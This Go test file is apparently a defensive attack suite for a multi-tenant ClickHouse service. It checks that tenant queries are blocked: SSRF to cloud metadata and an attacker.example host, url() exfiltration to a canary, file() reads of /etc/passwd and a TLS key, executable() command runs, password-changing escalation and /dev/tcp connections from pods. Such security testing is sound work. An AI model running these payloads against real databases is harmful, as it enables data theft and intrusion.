//go:build attack

// Package attack is the M3 attack suite: it acts as tenant A against live clusters and asserts
// that every attempt fails, for the expected reason. Run it with test/attack/run.sh, which
// sets the environment below, port-forwards the shared gateway and deploys the canary.
//
// Every attack names the error codes that count as "blocked by the right control". Any other
// outcome fails the test: success obviously, but also a syntax error or an unexpected code,
// which would mean the attack did not exercise the defence it claims to.
package attack

import (
	"context"
	"crypto/tls"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"regexp"
	"strconv"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/avilashs/clickhouse_as_service/internal/agent"
	"github.com/avilashs/clickhouse_as_service/internal/engine/clickhouse"
	"github.com/avilashs/clickhouse_as_service/internal/secrets"
)

// ClickHouse error codes the attacks expect.
const (
	codeAccessDenied       = 497 // ACCESS_DENIED (grants)
	codeConstraint         = 452 // SETTING_CONSTRAINT_VIOLATION
	codeURLNotAllowed      = 491 // UNACCEPTABLE_URL (remote_url_allow_hosts)
	codeStorageReadonly    = 495 // ACCESS_STORAGE_READONLY (users_xml)
	codeDatabaseDenied     = 291 // DATABASE_ACCESS_DENIED (user_files_path)
	codeFunctionNotAllowed = 446 // FUNCTION_NOT_ALLOWED (introspection)
	codeAuthFailed         = 516 // AUTHENTICATION_FAILED
	codeWrongPassword      = 194 // REQUIRED_PASSWORD: also returned when the user exists but the client's address is not allowed
	codePathDenied         = 481 // PATH_ACCESS_DENIED (dictionary file outside user_files_path)
	codeDictionaryDenied   = 482 // DICTIONARY_ACCESS_DENIED (executable dictionaries from DDL)
	codeMemoryLimit        = 241 // MEMORY_LIMIT_EXCEEDED
	codeUnknownStorage     = 56  // UNKNOWN_STORAGE (Replicated DB rejects plain MergeTree)
	codeSyntax             = 62  // SYNTAX_ERROR: never acceptable
)

type cluster struct {
	project, token, id string
	host, ca, adminPW  string
}

type env struct {
	api, gatewayHTTPS, gatewayNative string
	a, b                             cluster
	runID                            string
	start                            time.Time
	canary                           string // in-cell canary Service (basalt-system)
	cellCA                           *agent.CA
}

var (
	envOnce sync.Once
	theEnv  *env
)

func must(t *testing.T, err error) {
	t.Helper()
	if err != nil {
		t.Fatal(err)
	}
}

func getenv(t *testing.T, k string) string {
	v := os.Getenv(k)
	if v == "" {
		t.Skipf("%s not set (run test/attack/run.sh)", k)
	}
	return v
}

func setup(t *testing.T) *env {
	t.Helper()
	envOnce.Do(func() {
		e := &env{
			api: getenv(t, "ATTACK_API"), gatewayHTTPS: getenv(t, "ATTACK_GATEWAY_HTTPS"), gatewayNative: getenv(t, "ATTACK_GATEWAY_NATIVE"),
			a:      cluster{project: getenv(t, "ATTACK_PROJECT_A"), token: getenv(t, "ATTACK_TOKEN_A"), id: getenv(t, "ATTACK_CLUSTER_A")},
			b:      cluster{project: getenv(t, "ATTACK_PROJECT_B"), token: getenv(t, "ATTACK_TOKEN_B"), id: getenv(t, "ATTACK_CLUSTER_B")},
			runID:  fmt.Sprintf("r%d", rand.New(rand.NewSource(time.Now().UnixNano())).Intn(1e9)),
			start:  time.Now().UTC().Add(-2 * time.Second),
			canary: "attack-canary.basalt-system.svc.cluster.local",
		}
		for _, c := range []*cluster{&e.a, &e.b} {
			var info struct {
				Endpoint struct{ Host, CACertificate string } `json:"endpoint"`
			}
			st, body := e.apiDo("GET", "/v1/projects/"+c.project+"/clusters/"+c.id, c.token)
			if st != 200 || json.Unmarshal(body, &info) != nil {
				t.Fatalf("describe %s: %d %s", c.id, st, body)
			}
			c.host, c.ca = info.Endpoint.Host, info.Endpoint.CACertificate
			var cred struct{ Password string }
			st, body = e.apiDo("GET", "/v1/projects/"+c.project+"/clusters/"+c.id+"/initialCredentials", c.token)
			if st != 200 || json.Unmarshal(body, &cred) != nil {
				t.Fatalf("credentials %s: %d", c.id, st)
			}
			c.adminPW = cred.Password
		}
		theEnv = e
	})
	if theEnv == nil {
		t.Fatal("setup failed")
	}
	return theEnv
}

func (e *env) apiDo(method, path, token string) (int, []byte) {
	req, _ := http.NewRequest(method, e.api+path, nil)
	if token != "" {
		req.Header.Set("Authorization", "Bearer "+token)
	}
	resp, err := (&http.Client{Transport: &http.Transport{Proxy: nil}, Timeout: 20 * time.Second}).Do(req)
	if err != nil {
		return 0, []byte(err.Error())
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, b
}

// ---------------------------------------------------------------- SQL over HTTPS via the gateway

type client struct {
	http     *http.Client
	host     string
	user, pw string
	certAuth bool
}

// tlsTo returns a TLS config that verifies the server as host against the cell CA.
func tlsTo(c cluster) *tls.Config {
	pool := x509.NewCertPool()
	pool.AppendCertsFromPEM([]byte(c.ca))
	return &tls.Config{RootCAs: pool, ServerName: c.host, MinVersion: tls.VersionTLS12}
}

// connect returns a client for cluster c through the shared gateway (SNI = c.host).
func (e *env) connect(c cluster, user, pw string, cert *tls.Certificate) *client {
	tc := tlsTo(c)
	if cert != nil {
		tc.Certificates = []tls.Certificate{*cert}
	}
	tr := &http.Transport{
		Proxy: nil, TLSClientConfig: tc,
		DialContext: func(ctx context.Context, _, _ string) (net.Conn, error) {
			return (&net.Dialer{Timeout: 5 * time.Second}).DialContext(ctx, "tcp", e.gatewayHTTPS)
		},
	}
	return &client{http: &http.Client{Transport: tr, Timeout: 60 * time.Second}, host: c.host, user: user, pw: pw, certAuth: cert != nil}
}

var codeRE = regexp.MustCompile(`Code: (\d+)`)

type result struct {
	body string
	code int    // ClickHouse error code, 0 on success
	err  string // transport / TLS error
}

func (r result) String() string {
	if r.err != "" {
		return "transport error: " + r.err
	}
	if r.code != 0 {
		return fmt.Sprintf("code %d: %.200s", r.code, strings.TrimSpace(r.body))
	}
	return fmt.Sprintf("SUCCEEDED: %.200s", strings.TrimSpace(r.body))
}

func (c *client) q(sql string) result { return c.qp(sql, nil) }

// qp runs sql with extra HTTP parameters (query_id, settings).
func (c *client) qp(sql string, params url.Values) result {
	v := url.Values{"default_format": {"TSV"}}
	for k, vs := range params {
		v[k] = vs
	}
	req, _ := http.NewRequest("POST", "https://"+c.host+"/?"+v.Encode(), strings.NewReader(sql))
	req.Header.Set("X-ClickHouse-User", c.user)
	if c.certAuth {
		req.Header.Set("X-ClickHouse-SSL-Certificate-Auth", "on")
	} else {
		req.Header.Set("X-ClickHouse-Key", c.pw)
	}
	resp, err := c.http.Do(req)
	if err != nil {
		return result{err: err.Error()}
	}
	defer resp.Body.Close()
	b, _ := io.ReadAll(resp.Body)
	r := result{body: string(b)}
	if resp.StatusCode != 200 {
		r.code = -1
		if m := codeRE.FindStringSubmatch(r.body); m != nil {
			r.code, _ = strconv.Atoi(m[1])
		}
	}
	return r
}

func (e *env) admin(c cluster) *client { return e.connect(c, clickhouse.CustomerAdmin, c.adminPW, nil) }

// expectDenied fails unless r is an error with one of the codes.
func expectDenied(t *testing.T, r result, codes ...int) {
	t.Helper()
	if r.err != "" {
		t.Fatalf("expected a ClickHouse error %v, got %s", codes, r)
	}
	if r.code == codeSyntax {
		t.Fatalf("attack has a syntax error, so it proves nothing: %s", r)
	}
	for _, c := range codes {
		if r.code == c {
			return
		}
	}
	t.Fatalf("expected one of codes %v, got %s", codes, r)
}

func expectOK(t *testing.T, r result) string {
	t.Helper()
	if r.err != "" || r.code != 0 {
		t.Fatalf("control query must succeed: %s", r)
	}
	return strings.TrimSpace(r.body)
}

// ---------------------------------------------------------------- kubectl helpers

func kubectl(args ...string) (string, error) {
	out, err := exec.Command("kubectl", args...).CombinedOutput()
	return string(out), err
}

// podTCP tries a raw TCP connection from inside tenant A's server pod (bash /dev/tcp). It
// models an attacker with code execution in the ClickHouse process: ClickHouse grants and
// settings no longer matter, only the network policy does.
func (e *env) podTCP(target string, port int) (bool, string) {
	ns, pod := "ch-"+e.a.id, "chi-"+e.a.id+"-default-0-0-0"
	out, err := kubectl("-n", ns, "exec", pod, "--", "timeout", "6", "bash", "-c",
		fmt.Sprintf("exec 3<>/dev/tcp/%s/%d && echo CONNECTED", target, port))
	return err == nil && strings.Contains(out, "CONNECTED"), strings.TrimSpace(out)
}

func (e *env) canaryHits() []string {
	out, _ := kubectl("-n", "basalt-system", "logs", "deploy/attack-canary", "--since-time="+e.start.Format(time.RFC3339))
	var hits []string
	for _, l := range strings.Split(out, "\n") {
		if strings.HasPrefix(l, "HIT ") {
			hits = append(hits, l)
		}
	}
	return hits
}

func (e *env) cellCertificate(t *testing.T, cn string) tls.Certificate {
	t.Helper()
	out, err := kubectl("-n", "basalt-system", "get", "secret", "basalt-cell-ca", "-o", "jsonpath={.data.tls\\.crt} {.data.tls\\.key}")
	must(t, err)
	parts := strings.Fields(out)
	if len(parts) != 2 {
		t.Fatalf("cell CA secret: %q", out)
	}
	crt, key := decodeB64(t, parts[0]), decodeB64(t, parts[1])
	cb, _ := pem.Decode(crt)
	kb, _ := pem.Decode(key)
	cert, err := x509.ParseCertificate(cb.Bytes)
	must(t, err)
	k, err := x509.ParseECPrivateKey(kb.Bytes)
	must(t, err)
	ca := &agent.CA{Cert: cert, Key: k, CertPEM: crt}
	c, err := ca.ClientCertificate(cn, time.Hour)
	must(t, err)
	return c
}

func decodeB64(t *testing.T, s string) []byte {
	cmd := exec.Command("base64", "-d")
	cmd.Stdin = strings.NewReader(s)
	b, err := cmd.Output()
	must(t, err)
	return b
}

// ---------------------------------------------------------------- the attacks

type attack struct {
	id, name string
	sql      string
	codes    []int
	setup    []string // run first, errors ignored
	cleanup  []string // run after, errors ignored
}

func (e *env) catalog() []attack {
	b := e.b
	bHost := "chi-" + b.id + "-default-0-0.ch-" + b.id + ".svc.cluster.local"
	// The "g" variants target the cluster's own replica. In run 2 (docs/m3-report.md) the
	// own hosts passed remote_url_allow_hosts, so they exercised the grant layer alone and
	// returned 497 for every source except HTTP dictionaries (S17g, which have no grant
	// check upstream). The allowlist now matches no host, so either control may answer.
	ownHost := "chi-" + e.a.id + "-default-0-1.ch-" + e.a.id + ".svc.cluster.local"
	can := e.canary
	m := func(n string) string { return "/" + e.runID + "/" + n }
	return []attack{
		// --- SSRF: ClickHouse as an HTTP/TCP client
		{"S1", "url() to cloud metadata", "SELECT * FROM url('http://169.254.169.254/latest/meta-data/', 'LineAsString')", []int{codeAccessDenied}, nil, nil},
		{"S2", "url() to an in-cell service", "SELECT * FROM url('http://" + can + ":8080" + m("S2") + "', 'LineAsString')", []int{codeAccessDenied}, nil, nil},
		{"S3", "url() to the control plane (host network)", "SELECT * FROM url('http://172.18.0.1:8080/v1/cells/cell1/desired', 'LineAsString')", []int{codeAccessDenied}, nil, nil},
		{"S4", "url() to the Kubernetes API", "SELECT * FROM url('https://10.96.0.1/api', 'LineAsString')", []int{codeAccessDenied}, nil, nil},
		{"S5", "s3() to metadata", "SELECT * FROM s3('http://169.254.169.254/bucket/key', 'LineAsString')", []int{codeAccessDenied}, nil, nil},
		{"S6", "remote() to another tenant", "SELECT * FROM remote('" + bHost + ":9440', system.one)", []int{codeAccessDenied, codeURLNotAllowed}, nil, nil},
		{"S7", "remoteSecure() to another tenant", "SELECT * FROM remoteSecure('" + bHost + ":9440', system.one, 'admin', '')", []int{codeAccessDenied, codeURLNotAllowed}, nil, nil},
		{"S8", "mysql() to an in-cell service", "SELECT * FROM mysql('" + can + ":3306', 'db', 't', 'u', 'p')", []int{codeAccessDenied, codeURLNotAllowed}, nil, nil},
		{"S9", "postgresql() to an in-cell service", "SELECT * FROM postgresql('" + can + ":5432', 'db', 't', 'u', 'p')", []int{codeAccessDenied, codeURLNotAllowed}, nil, nil},
		{"S10", "mongodb() to an in-cell service", "SELECT * FROM mongodb('" + can + ":27017', 'db', 'c', 'u', 'p', 'x String')", []int{codeAccessDenied, codeURLNotAllowed}, nil, nil},
		{"S11", "redis() to an in-cell service", "SELECT * FROM redis('" + can + ":6379', 'k', 'k String')", []int{codeAccessDenied, codeURLNotAllowed}, nil, nil},
		{"S12", "INSERT INTO FUNCTION url() (exfiltration)", "INSERT INTO FUNCTION url('http://" + can + ":8080" + m("S12") + "', 'CSV', 'x String') VALUES ('exfil')", []int{codeAccessDenied}, nil, nil},
		{"S13", "URL table engine", "CREATE TABLE default.att_url (x String) ENGINE = URL('http://" + can + ":8080" + m("S13") + "', 'CSV')", []int{codeAccessDenied}, nil, []string{"DROP TABLE IF EXISTS default.att_url"}},
		{"S14", "S3 table engine", "CREATE TABLE default.att_s3 (x String) ENGINE = S3('http://" + can + ":8080/bucket/key', 'CSV')", []int{codeAccessDenied}, nil, []string{"DROP TABLE IF EXISTS default.att_s3"}},
		{"S15", "Kafka table engine", "CREATE TABLE default.att_kafka (x String) ENGINE = Kafka('" + can + ":9000', 't', 'g', 'CSV')", []int{codeAccessDenied}, nil, []string{"DROP TABLE IF EXISTS default.att_kafka"}},
		{"S16", "MySQL table engine", "CREATE TABLE default.att_mysql (x String) ENGINE = MySQL('" + can + ":3306', 'db', 't', 'u', 'p')", []int{codeAccessDenied}, nil, []string{"DROP TABLE IF EXISTS default.att_mysql"}},
		{"S17", "HTTP dictionary source", "SELECT dictGet('default.att_dict_http', 'v', toUInt64(1))", []int{codeAccessDenied, codeURLNotAllowed},
			[]string{"CREATE DICTIONARY default.att_dict_http (k UInt64, v String) PRIMARY KEY k SOURCE(HTTP(url 'http://" + can + ":8080" + m("S17") + "' format 'TSV')) LAYOUT(FLAT()) LIFETIME(0)"},
			[]string{"DROP DICTIONARY IF EXISTS default.att_dict_http"}},
		{"S18", "azureBlobStorage()", "SELECT * FROM azureBlobStorage('http://" + can + ":8080', 'c', 'b', 'CSV')", []int{codeAccessDenied}, nil, nil},
		{"S19", "hdfs()", "SELECT * FROM hdfs('hdfs://" + can + ":9000/x', 'CSV', 'x String')", []int{codeAccessDenied}, nil, nil},
		{"S6g", "remote() to the cluster's own replica (grant layer)", "SELECT * FROM remote('" + ownHost + ":9440', system.one)", []int{codeAccessDenied, codeURLNotAllowed}, nil, nil},
		{"S7g", "remoteSecure() to the cluster's own replica (grant layer)", "SELECT * FROM remoteSecure('" + ownHost + ":9440', system.one, 'admin', '')", []int{codeAccessDenied, codeURLNotAllowed}, nil, nil},
		{"S8g", "mysql() to the cluster's own replica (grant layer)", "SELECT * FROM mysql('" + ownHost + ":3306', 'db', 't', 'u', 'p')", []int{codeAccessDenied, codeURLNotAllowed}, nil, nil},
		{"S9g", "postgresql() to the cluster's own replica (grant layer)", "SELECT * FROM postgresql('" + ownHost + ":5432', 'db', 't', 'u', 'p')", []int{codeAccessDenied, codeURLNotAllowed}, nil, nil},
		{"S10g", "mongodb() to the cluster's own replica (grant layer)", "SELECT * FROM mongodb('" + ownHost + ":27017', 'db', 'c', 'u', 'p', 'x String')", []int{codeAccessDenied, codeURLNotAllowed}, nil, nil},
		{"S11g", "redis() to the cluster's own replica (grant layer)", "SELECT * FROM redis('" + ownHost + ":6379', 'k', 'k String')", []int{codeAccessDenied, codeURLNotAllowed}, nil, nil},
		{"S17g", "HTTP dictionary source on the cluster's own replica (host allowlist only)", "SELECT dictGet('default.att_dict_http_own', 'v', toUInt64(1))", []int{codeURLNotAllowed},
			[]string{"CREATE DICTIONARY default.att_dict_http_own (k UInt64, v String) PRIMARY KEY k SOURCE(HTTP(url 'https://" + ownHost + ":8443/?query=SELECT%201,%27x%27' format 'TSV')) LAYOUT(FLAT()) LIFETIME(0)"},
			[]string{"DROP DICTIONARY IF EXISTS default.att_dict_http_own"}},
		{"S20", "suffix trick against the host allowlist", "SELECT * FROM url('http://chi-" + e.a.id + "-default-0-0.attacker.example/x', 'LineAsString')", []int{codeAccessDenied}, nil, nil},

		// --- filesystem
		{"F1", "file() outside user_files", "SELECT * FROM file('/etc/passwd', 'LineAsString')", []int{codeAccessDenied, codeDatabaseDenied}, nil, nil},
		{"F2", "file() path traversal to the server config", "SELECT * FROM file('../../../etc/clickhouse-server/config.xml', 'LineAsString')", []int{codeAccessDenied, codeDatabaseDenied}, nil, nil},
		{"F3", "file() on the TLS private key", "SELECT * FROM file('/etc/basalt/certs/server.key', 'LineAsString')", []int{codeAccessDenied, codeDatabaseDenied}, nil, nil},
		{"F4", "INSERT INTO FUNCTION file() (write)", "INSERT INTO FUNCTION file('att.csv', 'CSV', 'x String') VALUES ('x')", []int{codeAccessDenied}, nil, nil},
		{"F5", "File table engine", "CREATE TABLE default.att_file (x String) ENGINE = File(CSV)", []int{codeAccessDenied}, nil, []string{"DROP TABLE IF EXISTS default.att_file"}},
		{"F6", "Keeper contents via system.zookeeper", "SELECT name FROM system.zookeeper WHERE path = '/'", []int{codeAccessDenied}, nil, nil},
		{"F7", "Keeper connection details", "SELECT * FROM system.zookeeper_connection", []int{codeAccessDenied}, nil, nil},
		{"F8", "file dictionary source", "SELECT dictGet('default.att_dict_file', 'v', toUInt64(1))", []int{codeAccessDenied, codeDatabaseDenied, codePathDenied},
			[]string{"CREATE DICTIONARY default.att_dict_file (k UInt64, v String) PRIMARY KEY k SOURCE(FILE(path '/etc/passwd' format 'TSV')) LAYOUT(FLAT()) LIFETIME(0)"},
			[]string{"DROP DICTIONARY IF EXISTS default.att_dict_file"}},

		// --- code execution
		{"E1", "executable() table function", "SELECT * FROM executable('id', 'TSV', 'x String')", []int{codeAccessDenied}, nil, nil},
		{"E2", "Executable table engine", "CREATE TABLE default.att_exec (x String) ENGINE = Executable('id', 'TSV')", []int{codeAccessDenied}, nil, []string{"DROP TABLE IF EXISTS default.att_exec"}},
		{"E3", "ExecutablePool table engine", "CREATE TABLE default.att_execpool (x String) ENGINE = ExecutablePool('id', 'TSV')", []int{codeAccessDenied}, nil, []string{"DROP TABLE IF EXISTS default.att_execpool"}},
		{"E4", "executable dictionary source", "SELECT dictGet('default.att_dict_exec', 'v', toUInt64(1))", []int{codeAccessDenied, codeDictionaryDenied},
			[]string{"CREATE DICTIONARY default.att_dict_exec (k UInt64, v String) PRIMARY KEY k SOURCE(EXECUTABLE(command 'id' format 'TSV')) LAYOUT(FLAT()) LIFETIME(0)"},
			[]string{"DROP DICTIONARY IF EXISTS default.att_dict_exec"}},
		{"E5", "introspection (memory layout)", "SELECT addressToSymbol(toUInt64(0))", []int{codeAccessDenied, codeFunctionNotAllowed}, nil, nil},
		{"E6", "SYSTEM SHUTDOWN", "SYSTEM SHUTDOWN", []int{codeAccessDenied}, nil, nil},
		{"E7", "SYSTEM RELOAD CONFIG", "SYSTEM RELOAD CONFIG", []int{codeAccessDenied}, nil, nil},
		{"E8", "SYSTEM DROP REPLICA (Keeper metadata)", "SYSTEM DROP REPLICA 'x' FROM ZKPATH '/clickhouse/tables'", []int{codeAccessDenied}, nil, nil},

		// --- privilege escalation
		{"P1", "change the provider user's password", "ALTER USER provider_ops IDENTIFIED WITH plaintext_password BY 'pwned'", []int{codeAccessDenied, codeStorageReadonly}, nil, nil},
		{"P2", "change the default user's password", "ALTER USER default IDENTIFIED WITH plaintext_password BY 'pwned'", []int{codeAccessDenied, codeStorageReadonly}, nil, nil},
		{"P3", "grant self everything", "GRANT ALL ON *.* TO admin", []int{codeAccessDenied}, nil, nil},
		{"P4", "grant self URL access", "GRANT READ ON URL TO admin", []int{codeAccessDenied}, nil, nil},
		{"P5", "grant self plain MergeTree", "GRANT TABLE ENGINE ON MergeTree TO admin", []int{codeAccessDenied}, nil, nil},
		{"P6", "give a new role a source grant", "GRANT READ ON S3 TO att_role", []int{codeAccessDenied}, []string{"CREATE ROLE IF NOT EXISTS att_role"}, []string{"DROP ROLE IF EXISTS att_role"}},
		{"P7", "impersonate the provider user", "EXECUTE AS provider_ops SELECT 1", []int{codeAccessDenied}, nil, nil},
		{"P8", "settings profile without limits", "CREATE SETTINGS PROFILE att_profile SETTINGS max_memory_usage = 0", []int{codeAccessDenied, codeConstraint}, nil, []string{"DROP SETTINGS PROFILE IF EXISTS att_profile"}},
		{"P9", "drop the provider's row policy", "DROP ROW POLICY basalt_hide_provider ON system.query_log", []int{codeAccessDenied}, nil, nil},
		{"P10", "replace the provider's row policy", "CREATE ROW POLICY OR REPLACE basalt_hide_provider ON system.query_log USING 1 TO ALL", []int{codeAccessDenied}, nil, nil},
		{"P11", "truncate the provider's query log", "TRUNCATE TABLE system.query_log", []int{codeAccessDenied}, nil, nil},
		{"P12", "drop a system log table", "DROP TABLE system.query_log", []int{codeAccessDenied}, nil, nil},
		{"P13", "change system log retention", "ALTER TABLE system.query_log MODIFY TTL event_date + INTERVAL 1 DAY", []int{codeAccessDenied}, nil, nil},
		{"P14", "use a named collection", "CREATE NAMED COLLECTION att_nc AS url = 'http://" + can + ":8080'", []int{codeAccessDenied}, nil, []string{"DROP NAMED COLLECTION IF EXISTS att_nc"}},
		{"P15", "BACKUP to the filesystem", "BACKUP TABLE system.one TO File('att')", []int{codeAccessDenied}, nil, nil},

		// --- raising limits past constraints
		{"L1", "unlimited query memory", "SELECT 1 SETTINGS max_memory_usage = 0", []int{codeConstraint}, nil, nil},
		{"L2", "query memory above the size", "SELECT 1 SETTINGS max_memory_usage = 1000000000000", []int{codeConstraint}, nil, nil},
		{"L3", "unlimited per-user memory", "SELECT 1 SETTINGS max_memory_usage_for_user = 0", []int{codeConstraint}, nil, nil},
		{"L4", "more threads than the size", "SELECT 1 SETTINGS max_threads = 64", []int{codeConstraint}, nil, nil},
		{"L5", "more concurrent queries than the size", "SELECT 1 SETTINGS max_concurrent_queries_for_user = 100000", []int{codeConstraint}, nil, nil},
		{"L6", "allow plain MergeTree in Replicated databases", "SELECT 1 SETTINGS database_replicated_allow_only_replicated_engine = 0", []int{codeConstraint}, nil, nil},
		{"L7", "acknowledge async inserts before they are written", "SELECT 1 SETTINGS wait_for_async_insert = 0", []int{codeConstraint}, nil, nil},
		{"L8", "enable introspection functions", "SELECT 1 SETTINGS allow_introspection_functions = 1", []int{codeConstraint}, nil, nil},
		{"L9", "plain (unreplicated) MergeTree", "CREATE TABLE default.att_plain (id UInt64) ENGINE = MergeTree ORDER BY id", []int{codeAccessDenied, codeUnknownStorage}, nil, []string{"DROP TABLE IF EXISTS default.att_plain"}},
		{"L10", "runaway query (must fail with a memory error, not kill the pod)", "SELECT length(groupArray(toString(number))) FROM numbers(2000000000)", []int{codeMemoryLimit}, nil, nil},
	}
}

// TestControls shows the suite is not vacuous: normal tenant work succeeds.
func TestControls(t *testing.T) {
	e := setup(t)
	a := e.admin(e.a)
	expectOK(t, a.q("SELECT 1"))
	expectOK(t, a.q("CREATE TABLE IF NOT EXISTS default.att_ctl ON CLUSTER default (id UInt64) ENGINE = ReplicatedMergeTree ORDER BY id"))
	expectOK(t, a.q("INSERT INTO default.att_ctl SELECT number FROM numbers(100) SETTINGS insert_quorum = 2"))
	if got := expectOK(t, a.q("SELECT count() FROM default.att_ctl")); got != "100" {
		t.Fatalf("count = %s", got)
	}
	expectOK(t, a.q("CREATE FUNCTION IF NOT EXISTS att_double AS x -> x * 2"))
	expectOK(t, a.q("CREATE USER IF NOT EXISTS att_analyst IDENTIFIED WITH sha256_password BY 'Att-analyst-1'"))
	expectOK(t, a.q("SELECT count() FROM system.query_log"))
	t.Cleanup(func() {
		for _, s := range []string{"DROP TABLE IF EXISTS default.att_ctl ON CLUSTER default SYNC", "DROP FUNCTION IF EXISTS att_double", "DROP USER IF EXISTS att_analyst"} {
			a.q(s)
		}
	})
}

// TestTenantAttacks runs the catalog as tenant A's admin, then checks the canary.
func TestTenantAttacks(t *testing.T) {
	e := setup(t)
	a := e.admin(e.a)
	for _, at := range e.catalog() {
		at := at
		t.Run(at.id+" "+at.name, func(t *testing.T) {
			for _, s := range at.setup {
				a.q(s)
			}
			defer func() {
				for _, s := range at.cleanup {
					a.q(s)
				}
			}()
			expectDenied(t, a.q(at.sql), at.codes...)
		})
	}
	t.Run("server still serves after the attacks", func(t *testing.T) { expectOK(t, a.q("SELECT 1")) })
	t.Run("no request reached the canary", func(t *testing.T) {
		time.Sleep(2 * time.Second)
		if hits := e.canaryHits(); len(hits) > 0 {
			t.Fatalf("%d connections reached the canary:\n%s", len(hits), strings.Join(hits, "\n"))
		}
	})
}

// TestTenantCreatedUserCannotEscapeLimits: a user the tenant creates without any role or
// profile still has the size's limits (review A1).
func TestTenantCreatedUserCannotEscapeLimits(t *testing.T) {
	e := setup(t)
	a := e.admin(e.a)
	expectOK(t, a.q("CREATE USER IF NOT EXISTS att_bare IDENTIFIED WITH sha256_password BY 'Att-bare-pw-1'"))
	expectOK(t, a.q("GRANT SELECT ON default.* TO att_bare"))
	defer a.q("DROP USER IF EXISTS att_bare")
	u := e.connect(e.a, "att_bare", "Att-bare-pw-1", nil)
	expectOK(t, u.q("SELECT 1"))
	for _, s := range []string{
		"SELECT 1 SETTINGS max_memory_usage = 0", "SELECT 1 SETTINGS max_threads = 64",
		"SELECT 1 SETTINGS database_replicated_allow_only_replicated_engine = 0", "SELECT 1 SETTINGS allow_introspection_functions = 1",
	} {
		expectDenied(t, u.q(s), codeConstraint)
	}
}

// TestProviderAccountsUnreachableFromTenantSide: platform users cannot be used through the
// tenant gateway, even with their real secret where one exists.
func TestProviderAccountsUnreachableFromTenantSide(t *testing.T) {
	e := setup(t)
	t.Run("provider_ops with no certificate", func(t *testing.T) {
		expectDenied(t, e.connect(e.a, clickhouse.ProviderUser, "", nil).q("SELECT 1"), codeAuthFailed)
	})
	t.Run("provider_ops with a self-signed certificate (CN basalt-agent)", func(t *testing.T) {
		c := selfSigned(t, clickhouse.AgentClientCN)
		r := e.connect(e.a, clickhouse.ProviderUser, "", &c).q("SELECT 1")
		if r.err == "" && r.code == 0 {
			t.Fatalf("self-signed certificate accepted: %s", r)
		}
	})
	t.Run("clickhouse_operator with the real operator password", func(t *testing.T) {
		out, err := kubectl("-n", "kube-system", "get", "secret", "clickhouse-operator", "-o", "jsonpath={.data.password}")
		must(t, err)
		expectDenied(t, e.connect(e.a, "clickhouse_operator", string(decodeB64(t, out)), nil).q("SELECT 1"), codeAuthFailed)
	})
	t.Run("default user with its real password", func(t *testing.T) {
		st, err := secrets.NewFileStore(getenv(t, "ATTACK_SECRETS_DIR"))
		must(t, err)
		pw, err := st.Get(context.Background(), clickhouse.DefaultPasswordSecret(e.a.id))
		must(t, err)
		expectDenied(t, e.connect(e.a, "default", pw, nil).q("SELECT 1"), codeAuthFailed, codeWrongPassword)
	})
	t.Run("control: the agent's certificate works (so the denials above are not vacuous)", func(t *testing.T) {
		c := e.cellCertificate(t, clickhouse.AgentClientCN)
		expectOK(t, e.connect(e.a, clickhouse.ProviderUser, "", &c).q("SELECT 1"))
	})
}

func selfSigned(t *testing.T, cn string) tls.Certificate {
	t.Helper()
	out, err := exec.Command("bash", "-c", "d=$(mktemp -d); openssl req -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 -nodes -keyout $d/k -out $d/c -days 1 -subj /CN="+cn+" 2>/dev/null && cat $d/c $d/k").Output()
	must(t, err)
	c, err := tls.X509KeyPair(out, out)
	must(t, err)
	return c
}

// TestNoSecretsVisibleToTenant: nothing the tenant can read contains the provider's or
// other users' secrets, and provider activity is hidden from the tenant's log tables.
func TestNoSecretsVisibleToTenant(t *testing.T) {
	e := setup(t)
	a := e.admin(e.a)
	st, err := secrets.NewFileStore(getenv(t, "ATTACK_SECRETS_DIR"))
	must(t, err)
	defPW, err := st.Get(context.Background(), clickhouse.DefaultPasswordSecret(e.a.id))
	must(t, err)
	a.q("SYSTEM FLUSH LOGS")
	if got := expectOK(t, a.q("SELECT count() FROM system.query_log WHERE user IN ('provider_ops', 'default', 'clickhouse_operator')")); got != "0" {
		t.Errorf("provider activity visible in query_log: %s rows", got)
	}
	if got := expectOK(t, a.q("SELECT count() FROM system.processes WHERE user != currentUser()")); got != "0" {
		t.Errorf("other users' running queries visible: %s", got)
	}
	needles := []string{defPW, e.a.adminPW, e.b.adminPW}
	for _, q := range []string{
		"SELECT * FROM system.users FORMAT JSONEachRow",
		"SELECT * FROM system.query_log FORMAT JSONEachRow",
		"SELECT * FROM system.text_log ORDER BY event_time DESC LIMIT 20000 FORMAT JSONEachRow",
		"SELECT * FROM system.server_settings FORMAT JSONEachRow",
		"SELECT * FROM system.named_collections FORMAT JSONEachRow",
	} {
		r := a.q(q)
		for _, n := range needles {
			if n != "" && strings.Contains(r.body, n) {
				t.Errorf("a secret appears in the output of %q", q)
			}
		}
	}
}

// TestCrossTenant: tenant A cannot use or reach tenant B.
func TestCrossTenant(t *testing.T) {
	e := setup(t)
	t.Run("tenant A's admin credentials on tenant B's endpoint", func(t *testing.T) {
		expectDenied(t, e.connect(e.b, clickhouse.CustomerAdmin, e.a.adminPW, nil).q("SELECT 1"), codeAuthFailed)
	})
	t.Run("tenant A's certificate does not cover tenant B's name", func(t *testing.T) {
		conn, err := net.DialTimeout("tcp", e.gatewayNative, 5*time.Second)
		must(t, err)
		tc := tlsTo(e.a)
		tc.InsecureSkipVerify = true // inspect the certificate ourselves
		c := tls.Client(conn, tc)
		must(t, c.Handshake())
		leaf := c.ConnectionState().PeerCertificates[0]
		c.Close()
		if leaf.VerifyHostname(e.a.host) != nil || leaf.VerifyHostname(e.b.host) == nil {
			t.Fatalf("certificate names %v: must cover %s and not %s", leaf.DNSNames, e.a.host, e.b.host)
		}
	})
	t.Run("API: tenant A's token on tenant B's cluster", func(t *testing.T) {
		for _, p := range []string{
			"/v1/projects/" + e.b.project + "/clusters/" + e.b.id,
			"/v1/projects/" + e.b.project + "/clusters/" + e.b.id + "/initialCredentials",
			"/v1/projects/" + e.a.project + "/clusters/" + e.b.id + "/initialCredentials",
			"/v1/projects/" + e.b.project + "/clusters",
		} {
			if st, _ := e.apiDo("GET", p, e.a.token); st != 404 {
				t.Errorf("GET %s with tenant A's token: %d, want 404", p, st)
			}
		}
